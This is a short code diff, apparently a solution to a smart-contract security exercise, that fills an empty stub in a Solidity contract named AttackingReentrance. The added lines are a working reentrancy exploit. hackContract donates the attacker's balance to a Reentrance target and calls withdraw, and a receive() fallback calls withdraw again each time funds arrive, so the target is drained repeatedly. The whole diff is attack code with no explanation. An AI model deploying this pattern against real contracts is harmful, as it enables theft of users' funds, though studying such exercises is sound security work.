@@ -11,5 +11,14 @@ contract AttackingReentrance {
 
     function hackContract() external {
         // Code me!
+        Reentrance(contractAddress).donate{value: address(this).balance}(address(this));
+        Reentrance(contractAddress).withdraw();
+        
+        
+    }
+
+    receive() external payable{
+            Reentrance(contractAddress).withdraw();
+        
     }
 }
